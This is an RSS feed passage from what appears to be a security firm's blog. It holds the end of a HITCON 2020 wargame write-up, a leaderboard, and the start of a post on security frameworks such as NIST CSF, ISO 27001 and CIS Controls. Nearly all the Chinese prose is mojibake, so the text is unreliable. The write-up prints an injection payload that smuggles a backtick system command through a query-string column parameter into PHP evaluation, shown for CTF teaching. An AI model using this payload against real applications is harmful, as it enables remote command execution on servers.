&lt;p&gt;ÈÄôÂÄãËß£Ê≥ïÂà©Áî®Âä†Ê≥ïÈÅãÁÆóÂ≠êÁµÑÂêà id identifier ÂíåÈõôÂºïËôüÂ≠ó‰∏≤ÔºåÊé•ËëóÂú®ÈõôÂºïËôüÂ≠ó‰∏≤Âà©Áî® evaluation ÁâπÊÄßÂü∑Ë°å PHP Á®ãÂºèÁ¢ºÔºåÈÄèÈÅé execution operator Âü∑Ë°åÁ≥ªÁµ±Êåá‰ª§ÂæåÂÜç‰ª• print_r Âº∑Âà∂Ëº∏Âá∫ÁµêÊûúÔºåÂèñÂæó flag„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ÂåøÂêç:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: id=1&amp;amp;column=id%2b&quot;${`yes`}&quot;

SQL: SELECT id+&quot;${`yes`}&quot; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;id+&quot;${`yes`}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Âè¶Â§ñÈÇÑÊî∂Âà∞‰∏ÄÂÄãÂåøÂêçÊèê‰∫§ÁöÑËß£Ê≥ïÔºåÊÄùË∑ØËàáÂâçÈù¢Áõ∏ÂêåÔºåÁ∏Ω‰πãÂ∞±‰πüÈôÑ‰∏ä‰æÜ‰∫ÜÔΩû„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;ÁµêË™û&quot;&gt;ÁµêË™û&lt;/h2&gt;

&lt;p&gt;‰ª•‰∏äÂ∞±ÊòØÊàëÂÄëÈÄôÊ¨°ÁÇ∫ HITCON 2020 Ê∫ñÂÇôÁöÑ Wargame ÁöÑÂÖ∂‰∏≠‰∏ÄÈÅìÈñãÊîæÂºèÈ°åÁõÆÁöÑÂàÜ‰∫´ÂíåÂ§ßÂÆ∂ÁöÑËß£Ê≥ï‰ªãÁ¥πÔºå‰∏çÁü•ÈÅìÂêÑ‰ΩçÂñú‰∏çÂñúÊ≠°Âë¢Ôºü&lt;del&gt;ÂñúÊ≠°ÁöÑË©±Ë®òÂæóË®ÇÈñ±„ÄÅÊåâËÆö„ÄÅÂàÜ‰∫´‰ª•ÂèäÈñãÂïüÂ∞èÈà¥Èê∫Âî∑ÔºÅ&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;È°åÂ§ñË©±ÔºåÈÄôÊ¨°ÊàëÂÄëÁ∏ΩÂÖ±Êúâ 5 ÈÅì 100 ÂàÜÈ°åÁõÆÔºåÊòØÈ†òÂèñÂ∞èÁçéÂìÅÁöÑÂü∫Êú¨Ê¢ù‰ª∂Ôºå‰ΩÜÊàëÂÄëÈÇÑÊ∫ñÂÇô‰∫Ü 3 ÈÅìÂÉÖÊúâ 1 ÂàÜÁöÑ bonus È°åÁõÆÔºåÈ°ûÂûãÊòØ 2 ÂÄã web Ëàá 1 ÂÄãÂîØ‰∏ÄÁöÑ pwnÔºåËÆìÂ§ßÂÆ∂ËÉΩÈÄ≤‰∏ÄÊ≠•ÊåëÊà∞ÈÄ≤ÈöéÂØ¶Êà∞ËÉΩÂäõÔºåËÄåÈÄôÊ¨°ÊúâËß£ÈñãËá≥Â∞ë‰∏ÄÈÅì bonus È°åÁöÑÁÇ∫‰ª•‰∏ãÂÖ©‰ΩçÂèÉÂä†ËÄÖÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;11/14 Balsn CTF 2020 Á∏ΩÁçéÈáëÂçÅËê¨ÂÖÉ: 502 ÂàÜ&lt;/li&gt;
  &lt;li&gt;FI: 501&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÂèãÊÉÖÂ∑•ÂïÜÔºöÁî±Âè∞ÁÅ£Áü•Âêç CTF Êà∞Èöä‰πã‰∏ÄÁöÑ Balsn ËàâËæ¶ÁöÑ Balsn CTF 2020 Â∞áÂú® 11/14 ËàâËæ¶Ôºå‰ªñÂÄëÊ∫ñÂÇô‰∫ÜË±êÂØåÁöÑÊØîË≥ΩÁçéÈáëËàáÂÖÖÊªøÂâµÊÑè„ÄÅÊäÄË°ìÊÄßÁöÑÈ°åÁõÆÔºåÊÉ≥Ë≠âÊòéÂØ¶ÂäõÁöÑÊúãÂèãÂÄëÂèØ‰∏çË¶ÅÈåØÈÅé‰∫ÜÔºÅ&lt;/p&gt;

&lt;p&gt;Balsn Twitter: https://twitter.com/balsnctf/status/1316925652700889090
Balsn CTF 2020 on CTFtime: https://ctftime.org/event/1122/&lt;/p&gt;

&lt;p&gt;Âè¶Â§ñÁöÑÂè¶Â§ñÔºåÊúÄÂæåËÆìÊàëÂÄëÊÅ≠Âñú &lt;strong&gt;yuawn (https://twitter.com/_yuawn)&lt;/strong&gt; ‰ª• 1 ÂàÜ‰πãÂßøÊ¶ÆÁç≤ &lt;strong&gt;DEVCORE Wargame ÊúÄÂæå 1 Âêç&lt;/strong&gt;ÔºÅÂÖ®Â†¥ÊéíË°åÊ¶ú‰∏äÂîØ‰∏ÄÂæóÂàÜ‰∏çË∂ÖÈÅé 100 ÁöÑÂèÉÂä†ËÄÖÔºåÂêåÊôÇ‰ªñ‰πüÂèñÂæó‰∫Ü pwn È°åÁõÆÁöÑÈ¶ñÊÆ∫ÂÖºÂîØ‰∏ÄËß£ÔºåÊÅ≠Âñú‰ªñ üëèüëè„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊúÄÂæåÈôÑ‰∏ä‰ªäÂπ¥ÁöÑÂâçÂçÅÂêçÔºåÂ∞±ËÆìÊàëÂÄë 2021 Âπ¥ÂÜçË¶ãÂõâÔΩû&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Place&lt;/th&gt;
      &lt;th&gt;Team&lt;/th&gt;
      &lt;th&gt;Score&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;11/14 Balsn CTF 2020 Á∏ΩÁçéÈáëÂçÅËê¨ÂÖÉ&lt;/td&gt;
      &lt;td&gt;502&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;FI&lt;/td&gt;
      &lt;td&gt;501&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;mico&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;ankleboy&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;hans00&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;Meow&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;ginoah&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;cjiso1117&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;zodiuss&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10&lt;/td&gt;
      &lt;td&gt;dalun&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</description>
                <link>https://devco.re/blog/2020/10/30/devcore-wargame-at-hitcon-2020/</link>
                <guid>https://devco.re/blog/2020/10/30/devcore-wargame-at-hitcon-2020</guid>
                <pubDate>Fri, 30 Oct 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>‰Ω†ÁöÑË≥áÂÆâÁ≠ñÁï•Â§†ÊòéÁ¢∫ÂóéÔºüÈÄèÈÅéÊ°ÜÊû∂ÂÑ™ÂÖàÁ∑©Ëß£ÁúüÂØ¶Â®ÅËÑÖ</title>
                <description>&lt;h2 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h2&gt;

&lt;p&gt;ÈÄô‰∏ÄÁØáÊòØË∑ü Allen Âú® iThome 2020 Ë≥áÂÆâÂ§ßÊúÉ‰∏ÄËµ∑ÂàÜ‰∫´ÁöÑ‰∏ªÈ°å„ÄÇÂú®ÂúãÂÖßÔºåÂ§ßÂÆ∂ÊØîËºÉÂ∞ëË®éË´ñË≥áÂÆâÁ≠ñÁï•ÈÄôÂÄãË≠∞È°å„ÄÇ‰∏ªË¶ÅÂéüÂõ†Èô§‰∫ÜÈÄôÂÄãÈ°åÁõÆÂ§™ÈÅéËâ±ÊæÄ„ÄÅÁÑ°ËÅäÂ§ñÔºåÂæûÂïÜÊ•≠ÁöÑËßíÂ∫¶‰πü‰∏çÂÆπÊòìÊàêÁÇ∫Áç≤Âà©ÁöÑÊúçÂãô„ÄÇËÄåÊàëÂÄëÊúÉÊÉ≥ÂàÜ‰∫´ÈÄôÂÄã‰∏ªÈ°åÁöÑÂéüÂõ†ËàáÊàëÂÄë‰∏ªË¶ÅÁöÑÊúçÂãô„ÄåÁ¥ÖÈöäÊºîÁ∑¥„ÄçÊúâÈóú„ÄÇ&lt;/p&gt;

&lt;p&gt;Âü∑Ë°åÁ¥ÖÈöäÊºîÁ∑¥‰∏âÂπ¥Â§ö‰æÜÔºåÈõñÁÑ∂ÂçîÂä©‰ºÅÊ•≠ÊâæÂá∫Â®ÅËÑÖÁáüÈÅãÁöÑÈáçË¶ÅÂÖ•‰æµË∑ØÂæëÔºåÁîöËá≥ÁôºÁèæÈò≤Á¶¶Ê©üÂà∂ÁöÑ‰∏çË∂≥‰πãËôïÔºåË®±Â§öÁ©çÊ•µÁöÑÂÆ¢Êà∂Êõ¥ÊÉ≥Áü•ÈÅìÈô§‰∫ÜÁï∂Ê¨°Á¥ÖÈöäÊºîÁ∑¥ÁôºÁèæÁöÑÂïèÈ°åÂ§ñÔºåÊòØ‰∏çÊòØÊúâÊõ¥Âë®Âª∂ÁöÑÊñπÂºè‰æÜÁõ§ÈªûÈò≤Á¶¶ÁèæÊ≥ÅÁöÑ‰∏çË∂≥„ÄÇÂõ†Ê≠§ÔºåÊàëÂÄëÈñãÂßãÂ∞ãÊâæ‰∏ÄÂÄãÁµêÊßãÂåñ‰∏îÂÆåÊï¥ÁöÑÊñπÂºè‰æÜÊé¢Á©∂ÈÄôÂÄãË≠∞È°åÔºåÈñãÂßãÊÄùËÄÉÂúãÈöõÊ®ôÊ∫ñ„ÄÅÊ°ÜÊû∂ËàáÁ¥ÖÈöäÊºîÁ∑¥‰πãÈñìÁöÑÈóú‰øÇ„ÄÇÂ∏åÊúõÈô§‰∫ÜÂæûÊîªÊìäËÄÖÁöÑÊÄùÁ∂≠Ë∑üÊäÄÂ∑ßÊâæÂà∞‰ºÅÊ•≠ÁöÑÂïèÈ°åÂ§ñÔºå‰πüËÉΩÂæûÈò≤ÂÆàÊñπÁöÑËßíÂ∫¶ÊÄùËÄÉ‰ºÅÊ•≠Èï∑ÊúüËÄåÂÖ®Èù¢ÁöÑÈò≤Á¶¶Ë¶èÂäÉ„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;Ë§áÈõúÁöÑÂïèÈ°åÊõ¥Ë¶ÅÂæûÁ≠ñÁï•Èù¢ÊÄùËÄÉ&quot;&gt;Ë§áÈõúÁöÑÂïèÈ°åÔºåÊõ¥Ë¶ÅÂæûÁ≠ñÁï•Èù¢ÊÄùËÄÉ&lt;/h2&gt;

&lt;p&gt;Ë≥áÂÆâÊòØÈùûÂ∏∏Ë§áÈõúËÄå‰∏îÂàÜÂ∑•Á¥∞ËÜ©ÁöÑÂ∑•‰ΩúÔºå‰∏çÁ¢∫ÂÆöÂïèÈ°åÁöÑÊ†∏ÂøÉÂ∞±ÁÑ°Ê≥ïÈáêÊ∏ÖÊ¨äË≤¨„ÄÅÂÆâÊéíË≥áÊ∫êÔºåÈÅëË´ñÈôç‰ΩéÂÜçÁôºÁöÑÊ©üÁéá„ÄÇÂõ†Ê≠§Ë¶ÅËß£Ê±∫ÈÄôÂÄãË§áÈõúÂïèÈ°åÈúÄË¶ÅÊúâË≥áÂÆâÁ≠ñÁï•‰æÜÊîØÊíêÔºåËÄå‰∏çÊòØÈ†≠ÁóõÈÜ´È†≠„ÄÅËÖ≥ÁóõÈÜ´ËÖ≥„ÄÇÈ¶ñÂÖàÔºåÊàëÂÄëÊääË≥áÂÆâÁöÑÈò≤Ë≠∑ÂàÜÁÇ∫‰∏âÁ®ÆÈöéÊÆµÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÊÅ¢Âæ©ÂéüÁãÄÂûãÔºö‰ºÅÊ•≠Â∞á‰∏ªË¶ÅÁöÑË≥áÂÆâË≥áÊ∫êÊäïÊîæÂú®Êó•Â∏∏ÁöÑÁ∂≠ÈÅãÂèäÂïèÈ°åÊü•Êâæ‰∏äÔºåÂåÖÊã¨Á¢∫Ë™çÁï∂‰∏ãÁôºÁîüÁöÑÂïèÈ°å„ÄÅÈÄ≤Ë°åÁ∑äÊÄ•ËôïÁêÜ„ÄÅÁÅΩÂÆ≥ÊéßÂà∂„ÄÅÊü•ÊòéÂèäÂàÜÊûêÁôºÁîüÂéüÂõ†„ÄÅ‰øÆÂæ©ÂïèÈ°å„ÄÅÁ†îÁ©∂Â∞çÁ≠ñÈÅøÂÖçÂÜçÁôºÁîüÁ≠âÁ≠â„ÄÇ&lt;/li&gt;
  &lt;li&gt;Èò≤ÂæÆÊùúÊº∏ÂûãÔºöÂ∞áË≥áÊ∫êÊäïÂÖ•Âú®Â∞ç‰ºÅÊ•≠ÈÄ†ÊàêÈáçÂ§ßË°ùÊìäÁöÑÂïèÈ°å‰∏äÔºå‰∏¶ÊåÅÁ∫åÈÄ≤Ë°åÈ†êÈò≤ÂèäÂõûÊáâÁöÑË©ï‰º∞ËàáÊºîÁ∑¥„ÄÅÂòóË©¶ÊèêÂâçÊâæÂá∫ÂéüÂõ†ÔºåÂä†‰ª•È†êÈò≤ÊàñÊÄùËÄÉÊºîÁ∑¥ÁôºÁîüÊôÇÊáâË©≤Âü∑Ë°åÁöÑÂ∞çÁ≠ñ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ËøΩÊ±ÇÁêÜÊÉ≥/ÂçìË∂äÂûãÔºöÁõ§ÈªûÂèäÂàÜÊûêÂïèÈ°åÁöÑÂÑ™„ÄÅÁº∫ÈªûÔºåË®≠ÂÆö‰ºÅÊ•≠ÊåÅÁ∫åÁ≤æÈÄ≤ÁöÑÁõÆÊ®ôÔºåËóâÁî±Ë°åÂãïË®àÁï´‰æÜÈÅîÊàêÁõÆÊ®ô„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ê†πÊìöÊàëÂÄëÁöÑËßÄÂØüÔºåÂπæ‰πéÂ§öÊï∏ÁöÑ‰ºÅÊ•≠ÈÉΩÊòØËêΩÂú®„ÄåÊÅ¢Âæ©ÂéüÁãÄÂûã„ÄçÔºå‰ΩÜ‰ºÅÊ•≠Â§öÂçäË™çÁü•ÂÖ∂ÁÇ∫„ÄåÈò≤ÂæÆÊùúÊº∏Âûã„Äç„ÄÇÈÄ†ÊàêÈÄôÂÄãË™çÁü•‰∏äÁöÑËêΩÂ∑ÆÔºå‰∏ªÂõ†‰æÜËá™ÊñºÂ∞çËá™Ë∫´ÂÆâÂÖ®ÁãÄÊ≥ÅÁöÑ‰∏ç‰∫ÜËß£ÔºåÂ∞éËá¥Â∞çÊñºÈ¢®Èö™ÁöÑÊéåÊè°Á®ãÂ∫¶Áî¢ÁîüË™§Âà§„ÄÇÂõ†Ê≠§ÔºåÈÄèÈÅé‰∏ÄÂÄãÂÆèËßÄÁöÑÁ≠ñÁï•ÊÄùËÄÉÔºåÊúâÂä©ÊñºÁõ§ÈªûÂêÑÁ®ÆÊéßÂà∂Êé™ÊñΩ‰∏çË∂≥‰πãËôïÔºåÊâçÊúâÊ©üÊúÉÂ∞áÈò≤Á¶¶Á∏±Ê∑±ÁöÑÊ©üÂà∂Êã¥Á∑äËû∫Áµ≤ÔºåÊâìÈÄ†ÊúüÊúõÁöÑÈò≤Á¶¶È´îÁ≥ª„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÂàÜÂ±§Ë≤†Ë≤¨ÂêÑÂè∏ÂÖ∂ËÅ∑&quot;&gt;ÂàÜÂ±§Ë≤†Ë≤¨ÔºåÂêÑÂè∏ÂÖ∂ËÅ∑&lt;/h2&gt;

&lt;p&gt;ÊàëÂÄëÂª∫Ë≠∞Â∞áÁ∏±Ê∑±Èò≤Á¶¶‰ª•‰∏ÄÂÄãÊõ¥ÂÖ®Èù¢ÁöÑÊñπÂºè‰æÜÊ™¢Ë¶ñÔºåÂàÜÁÇ∫ Executive Layer„ÄÅProcess Layer„ÄÅProcedure Layer ‰ª•Âèä Technology Layer ÂõõÂ±§Ôºå‰∏ÄÂÄãÂ•ΩÁöÑÈò≤Á¶¶Á≠ñÁï•ÔºåÈô§‰∫ÜË¶ÅÂÅöÂà∞ R &amp;amp; R (Role &amp;amp; Responsibility) Â§ñÔºåÊõ¥ÈáçË¶ÅÁöÑÊòØÂú®‰∏äËÄå‰∏ãÂà∂ÂÆöÁ≠ñÁï•‰πãÂæåÔºåÁ∂ìÁî±‰∏ãËÄå‰∏äÁöÑÊñπÂºèÁ¢∫‰øùÁ≠ñÁï•ÁöÑÊúâÊïàÊÄßÔºåÂõ†Ê≠§‰∏çÂêåÈöéÂ±§ÁöÑË≥áÂÆâÂæûÊ•≠‰∫∫Âì°ÈÉΩÊúâÂÖ∂ÈúÄË¶ÅÈóúÊ≥®ÁöÑÈáçÈªû„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Executive LayerÔºöË≥áÂÆâÈï∑ (CISO) ÁöÑË¶ñËßíÔºåÈóúÊ≥®Ë∂≥‰ª•ÂΩ±ÈüøÁµÑÁπîÁáüÈÅãÁöÑÈ¢®Èö™ÂèäÁ∑©Ëß£ÈÄô‰∫õÈ¢®Èö™ÁöÑË≥áÊ∫êÊòØÂê¶ÂÖÖË∂≥„ÄÇÂèØ‰ª•ÂèÉËÄÉÁöÑÊ®ôÊ∫ñÂåÖÊã¨ NIST 800-39„ÄÅNIST 800-30„ÄÅISO 27005 ‰ª•Âèä CIS RAM„ÄÇ&lt;/li&gt;
  &lt;li&gt;Process LayerÔºöÈ´òÈöé‰∏ªÁÆ°ÁöÑË¶ñËßíÔºåÈóúÊ≥®ÊåÅÁ∫åÁ∂≠ÊåÅÁµÑÁπîÂÆâÂÖ®ÈÅã‰ΩúÁöÑÁÆ°ÁêÜÁ®ãÂ∫èÊòØÂê¶Ë∂≥Â§†ÂèäËêΩÂØ¶„ÄÅË¶èÂäÉÊú™‰æÜÁµÑÁπîË≥áÂÆâÁöÑÊàêÁÜüÂ∫¶Á≠â„ÄÇÂèÉËÄÉÁöÑÊ®ôÊ∫ñÂåÖÊã¨ NIST Cybersecurity Framework„ÄÅISO 27001 Á≠â„ÄÇ&lt;/li&gt;
  &lt;li&gt;Procedure LayerÔºö‰∏≠Èöé‰∏ªÁÆ°ÁöÑË¶ñËßíÔºåÂåÖÊã¨Ê±∫ÂÆöÂì™‰∫õÂÆâÂÖ®ÊéßÂà∂Êé™ÊñΩË¶ÅÂü∑Ë°å„ÄÅÂü∑Ë°åÁöÑÁ¥∞Á∑ªÁ®ãÂ∫¶ÔºåÈÄô‰∫õÈ†ÖÁõÆÂ∞±ÊòØ‰∏ÄËà¨ÊâÄË¨ÇÁöÑÂÆâÂÖ®ÊéßÂà∂Êé™ÊñΩ (security control)Ôºå‰æãÂ¶ÇÁµÑÊÖãË®≠ÂÆö„ÄÅÂØÜÁ¢ºÁÆ°ÁêÜ„ÄÅÊó•Ë™åÁ¥ÄÈåÑÁöÑÈ°ûÂûãÁ≠âÔºåÂèØ‰ª•ÂèÉËÄÉ NIST 800-53 ÊàñÊòØ CIS Critical Security Controls Á≠âË¶èÁØÑ„ÄÇ&lt;/li&gt;
  &lt;li&gt;Technology LayerÔºöÂàùÈöé‰∏ªÁÆ°ËàáÊäÄË°ì‰∫∫Âì°ÁöÑËßíÂ∫¶ÔºåÂåÖÂê´ÈáùÂ∞çÊîªÊìäËÄÖÁöÑÊäÄÂ∑ßÊâÄÊáâÂ∞çÁöÑË≥áÂÆâË®≠ÂÇô„ÄÅËá™ÂãïÂåñÂÆâÂÖ®ÊéßÂà∂Êé™ÊñΩÁöÑÂ∑•ÂÖ∑„ÄÅÁõ£ÊéßÂàÜÊûêÂ∑•ÂÖ∑Á≠âÁ≠â„ÄÇÁõÆÂâçÈÄôÈÉ®‰ªΩ‰πüÊòØÁµÑÁπîË≥áÂÆâÈò≤Á¶¶ÁöÑÈáçÈªûÔºåÂèØ‰ª•ÂèÉËÄÉË≥áÂÆâË®≠ÂÇôÊîØÊè¥ MITRE ATT&amp;amp;CK ÁöÑÊîªÊìäÊäÄÂ∑ß‰æÜÁõ§ÈªûÁèæÊúâÁöÑÈò≤Á¶¶Áº∫Âè£ÊàñÈÄèÈÅé OWASP Cyber Defense Matrix (CDM) ÂÆö‰ΩçÁî¢ÂìÅ„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;Ê°ÜÊû∂ËàáÊ®ôÊ∫ñÁöÑÂÆö‰Ωç&quot;&gt;Ê°ÜÊû∂ËàáÊ®ôÊ∫ñÁöÑÂÆö‰Ωç&lt;/h2&gt;

&lt;p&gt;Âú®Ë™™ÊòéÂÆå‰∏çÂêåÈöéÂ±§ÈóúÊ≥®ÁöÑÈáçÈªûÂæåÔºåÈÄôË£°ÁâπÂà•Ë™™ÊòéÂπæÂÄãÈáçË¶Å (Êàñ‰ΩøÁî®ÁéáËºÉÈ´ò) ÁöÑÊ®ôÊ∫ñÂèäÊ°ÜÊû∂„ÄÇÈô§‰∫ÜË¶ÅÁü•ÈÅìÂì™‰∫õÊ°ÜÊû∂Ë∑üÊ®ôÊ∫ñËàáË≥áÂÆâÊúâÈóúÂ§ñÔºåÂêåÊôÇ‰πüÈúÄË¶Å‰∫ÜËß£ÈÅ©Áî®ÁöÑÊÉÖÂ¢É„ÄÅÁõÆÁöÑÂèäÂΩºÊ≠§ÈñìÁöÑÂ∑ÆÁï∞&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ISO 27001ÔºöÂ±¨Êñº Process LayerÔºåÂÖ∂Êèê‰æõÂª∫Á´ãË≥áË®äÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁµ±ÁöÑÊ®ôÊ∫ñÔºåÂπ´Âä©ÁµÑÁπîÁÆ°ÁêÜÂíå‰øùË≠∑Ë≥áË®äË≥áÁî¢ÔºåÁ¢∫‰øùÈÅîÂà∞ÂÆ¢Êà∂ÊàñÂà©ÂÆ≥Èóú‰øÇ‰∫∫ÂÖ∂ÂÆâÂÖ®ÁöÑÊúüÂæÖÔºõÂèØ‰ª•ÂèñÂæóÈ©óË≠â„ÄÇ‰ΩÜË¶ÅÊèêÈÜíÁöÑÊòØÔºå27001 ‰ΩúÁÇ∫‰∏ÄÂÄãÂØ¶Ë∏êË≥áË®äÂÆâÂÖ®ÁÆ°ÁêÜ (Information Security System) ÁöÑÊ®ôÊ∫ñÔºåÈõñÁÑ∂ÂÖ∑ÊúâÊñá‰ª∂Âåñ (Documented) Ë¶ÅÊ±ÇÁöÑÂÑ™ÈªûÔºå‰ΩÜÂÖ∂Ë¶ÅÊ±ÇÈ†ÖÁõÆÂ§öÊï∏Âú®È†êÈò≤ (Prevent) ÂèäÈÅøÂÖç (Avoid) ‰∏äÔºåËºÉÂ∞ëËëóÈáçÂú®Âõ†ÊáâÁ∂≤Ë∑ØÂÆâÂÖ®ÁöÑÂÅµÊ∏¨ (Detect) ÂèäÂõûÊáâ (React) ‰∏ä„ÄÇ&lt;/li&gt;
  &lt;li&gt;NIST Cybersecurity Framework (CSF)ÔºöÂ±¨Êñº Process ViewÔºåÁî±ÁæéÂúã‰∏ªÂ∞éÁöÑÁ∂≤Ë∑ØÂÆâÂÖ®Ê°ÜÊû∂ÔºåÊèê‰æõÈóúÈçµÂü∫Á§éË®≠ÊñΩÊàñ‰∏ÄËà¨‰ºÅÊ•≠Âπ´Âä©ÁµÑÁπîÁÆ°ÁêÜÂíå‰øùË≠∑Ë≥áË®äË≥áÁî¢ÔºåÁ¢∫‰øùÂÖ∂ÂÆâÂÖ®ÁÑ°ÊÖÆÔºõÂèØ‰ª•È©óË≠â‰∏¶ÊúâÊàêÁÜüÂ∫¶Ê®°ÂºèÔºåÂèØ‰ª•ËÆì‰ºÅÊ•≠ÂÖàÊèèÁπ™Ëá™Â∑±ÁöÑË≥áÂÆâÁãÄÊÖã (profile) ‰∏¶ËóâÁî±Ë®ÇÂÆöÁõÆÊ®ôÈÄêÂπ¥Âº∑Âåñ‰ºÅÊ•≠ÁöÑÂÆâÂÖ®„ÄÇÂêåÊôÇÔºåÊòéÁ¢∫ÁöÑÂ∞áÂÆâÂÖ®Ë¶ÅÊ±ÇÁµêÊßãÂåñÁöÑÂàÜÊàêË≠òÂà• (Identify)„ÄÅÈò≤Á¶¶ (Protect)„ÄÅÂÅµÊ∏¨ (Detect)„ÄÅÂõûÊáâ (Respond) ÂèäÂæ©Âéü (Recover)Ôºå‰∏¶ÊîØÊè¥ÂÖ∂‰ªñÂÆâÂÖ®Ê®ôÊ∫ñËàáÊ°ÜÊû∂ÁöÑÂ∞çÊáâÔºåÂ¶Ç CIS CSC„ÄÅCOBIT„ÄÅ27001„ÄÅNIST 800-53 Á≠â„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CIS Cybersecurity ControlÔºöË≥áË®äÂÆâÂÖ®ÊéßÂà∂ÊåáÂºïÂ±¨Êñº Procedure ViewÔºåÈáùÂ∞çÁ∂≤Ë∑ØÊîªÊìäÊâÄÊáâÊé°ÂèñÁöÑÊéßÂà∂È†ÖÁõÆÊèêÂá∫ÂÑ™ÂÖàÂü∑Ë°åÈ†ÜÂ∫èÔºåÁµÑÁπîÂèØ‰æùÁÖßËá™Ë∫´ÁöÑË¶èÊ®° (IG1-IG3) Âü∑Ë°åÂ∞çÊáâÁöÑÊé™ÊñΩÔºå ÂàÜÁÇ∫Âü∫Á§éÂûã„ÄÅÂü∫Êú¨ÂûãÂèäÁµÑÁπîÂûãÔºåÂÖ± 20 ÂÄãÊéßÂà∂Áæ§ÁµÑ„ÄÅ178 ÂÄãÂ≠êÊéßÂà∂È†Ö„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;‰∏çËâØÁöÑË≥áÂÆâÈò≤Ë≠∑ÁãÄÊÖã&quot;&gt;‰∏çËâØÁöÑË≥áÂÆâÈò≤Ë≠∑ÁãÄÊÖã&lt;/h2&gt;

&lt;p&gt;ÂØ¶Âãô‰∏ä‰æÜË™™Ôºå‰ºÅÊ•≠ÁöÑÈò≤Á¶¶Á≠ñÁï•ÊúâÂÖ©Á®Æ‰∏çËâØÁöÑÁãÄÊÖã&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Á∏±Ê∑±Èò≤Ë≠∑‰∏çË∂≥ÔºöÈò≤Á¶¶Ê©üÂà∂‰∏çÂ§†ÂÖ®Èù¢ (Á¥ÖËâ≤Áº∫Âè£)„ÄÅË®≠ÂÇôÊïàÊûú‰∏çÂ¶ÇÂÆ£Á®± (ËóçËâ≤Áº∫Âè£)„ÄÅË®≠ÂÇôÊú¨Ë∫´ÁöÑÈôêÂà∂ (Ê©òËâ≤Áº∫Âè£)Ôºõ‰∏äËø∞ÁöÑÂïèÈ°åÔºåÁ∂úÂêàËÄåË®ÄÔºåÂ∞±ÊúÉ‰ΩøÂæóË®≠ÂÇôÈñìÁöÑÁ∂úÊïàÁÑ°Ê≥ïÈòªÊñ∑ÊîªÊìäÈèàÔºåÂΩ¢ÊàêÊäÄË°ìÂ±§ÁöÑÁ†¥Âè£„ÄÇ
&lt;img src=&quot;/assets/img/blog/20201013/4.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
